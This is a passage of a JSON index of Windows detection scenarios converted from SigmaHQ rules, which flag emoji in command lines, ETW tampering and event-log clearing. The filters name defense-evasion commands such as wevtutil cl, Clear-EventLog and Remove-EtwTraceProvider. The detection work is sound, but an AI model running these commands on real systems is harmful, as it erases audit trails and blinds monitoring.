'\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 4\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.\n", "path": "scenarios/sigmahq/proc_creation_win_susp_emoji_usage_in_cli_4.yml", "version": "0.2", "versions": {"0.1": {"digest": "86e511e36f43e01d8994afe9dbdad0e008498ee5075e278fdecbd576f2e053af"}, "0.2": {"digest": "5aa184accebaa4f25f2e973530785f14de8732baf6eafac4a291bdb61501b538"}}}, "sigmahq/proc_creation_win_susp_etw_modification_cmdline": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_etw_modification_cmdline\ndescription: |\n  Detects changes to environment variables related to ETW logging via the CommandLine. This could indicate potential adversaries stopping ETW providers recording loaded .NET assemblies. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'COMPlus_ETWEnabled' || evt.Parsed.CommandLine contains 'COMPlus_ETWFlags')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562\n\n  label: \"ETW Logging Tamper In .NET Processes Via CommandLine\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects changes to environment variables related to ETW logging via the CommandLine. This could indicate potential adversaries stopping ETW providers recording loaded .NET assemblies. \n", "path": "scenarios/sigmahq/proc_creation_win_susp_etw_modification_cmdline.yml", "version": "0.2", "versions": {"0.1": {"digest": "ec1d2583ab9b7b4dbf8d6e5bfb666aafaa6d525852b6ea5d5842b040e836331e"}, "0.2": {"digest": "8b58377cafee4773314f747d3f2bc4027f5d71e855b9fd567779d3c81b2b7fa6"}}}, "sigmahq/proc_creation_win_susp_etw_trace_evasion": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_etw_trace_evasion\ndescription: |\n  Detects command line activity that tries to clear or disable any ETW trace log which could be a sign of logging evasion. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'cl' && evt.Parsed.CommandLine contains '/Trace' || evt.Parsed.CommandLine contains 'clear-log' && evt.Parsed.CommandLine contains '/Trace' || evt.Parsed.CommandLine contains 'sl' && evt.Parsed.CommandLine contains '/e:false' || evt.Parsed.CommandLine contains 'set-log' && evt.Parsed.CommandLine contains '/e:false' || evt.Parsed.CommandLine contains 'logman' && evt.Parsed.CommandLine contains 'update' && evt.Parsed.CommandLine contains 'trace' && evt.Parsed.CommandLine contains '--p' && evt.Parsed.CommandLine contains '-ets' || evt.Parsed.CommandLine contains 'Remove-EtwTraceProvider' || evt.Parsed.CommandLine contains 'Set-EtwTraceProvider' && evt.Parsed.CommandLine contains '0x11')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1070\n   - attack.t1562.006\n\n  label: \"ETW Trace Evasion Activity\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects command line activity that tries to clear or disable any ETW trace log which could be a sign of logging evasion. \n", "path": "scenarios/sigmahq/proc_creation_win_susp_etw_trace_evasion.yml", "version": "0.2", "versions": {"0.1": {"digest": "96af29933ac67560dea4e7fd113b4caa43c8831a9c258fd46f3782b566ca2428"}, "0.2": {"digest": "84a22a5df5173b6423400904956bfa29630777b2004f1f8afef39c193f08b488"}}}, "sigmahq/proc_creation_win_susp_eventlog_clear": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_eventlog_clear\ndescription: |\n  Detects the clearing or configuration tampering of EventLog using utilities such as \"wevtutil\", \"powershell\" and \"wmic\". This technique were seen used by threat actors and ransomware strains in order to evade defenses. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\wevtutil.exe' && (evt.Parsed.CommandLine contains 'clear-log ' || evt.Parsed.CommandLine contains ' cl ' || evt.Parsed.CommandLine contains 'set-log ' || evt.Parsed.CommandLine contains ' sl ' || evt.Parsed.CommandLine contains 'lfn:') || (evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && (evt.Parsed.CommandLine contains 'Clear-EventLog ' || evt.Parsed.CommandLine contains 'Remove-EventLog ' || evt.Parsed.CommandLine contains 'Limit-EventLog ' || evt.Parsed.CommandLine contains 'Clear-WinEvent ') || (evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\wmic.exe') && evt.Parsed.CommandLine contains 'ClearEventLog') && not ((evt.Parsed.ParentImage in ['C:\\\\Windows\\\\SysWOW64\\\\msiexec.exe', 'C:\\\\Windows\\\\System32\\\\msiexec.exe']) && evt.Parsed.CommandLine contains ' sl '))\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1070.001\n   - attack.t1562.002\n\n  label: \"Suspicious Eventlog Clearing or Configuration Change Activity\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: 